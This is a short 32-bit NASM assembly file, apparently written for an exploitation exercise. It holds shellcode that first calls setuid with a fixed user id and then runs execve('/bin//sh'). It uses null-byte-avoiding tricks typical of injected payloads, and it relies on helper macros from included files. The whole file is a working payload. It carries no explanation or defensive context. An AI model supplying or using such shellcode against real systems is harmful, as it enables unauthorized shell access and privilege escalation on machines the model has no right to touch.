;; Mon Mar 11 05:34:41 PDT 2013
;; EBX, ECX, EDX, ESI, EDI, EBP then stack
BITS 32
global main
	%include "short32.s"
	%include "syscall.s"
	%include "util.s"

before:
	xor ebx, ebx
	mov bx, 17001
	xor eax, eax
	SYSTEM_CALL(setuid)

main:
	; execve("/bin/sh", 0, 0)
	xor eax, eax
	push eax
	PUSH_STRING "/bin//sh"
	mov ebx, esp		; arg1 = "/bin//sh\0"
	xor ecx, ecx		; arg2 = 0
	xor edx, edx		; arg3 = 0
	SYSTEM_CALL(execve)
